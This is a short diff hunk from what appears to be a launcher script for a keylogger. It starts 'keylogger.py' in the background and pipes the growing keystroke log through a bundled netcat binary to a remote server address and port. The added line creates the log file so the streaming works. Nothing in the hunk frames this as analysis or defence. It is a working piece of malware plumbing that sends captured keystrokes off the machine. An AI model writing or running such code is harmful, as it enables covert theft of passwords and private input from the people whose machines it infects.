@@ -7,6 +7,7 @@ python3 keylogger.py &
 
 chmod +x netcat
 sleep 0.5
+touch keys.log
 tail -f keys.log | ./netcat $SERVER_IP $PORT &
 
 
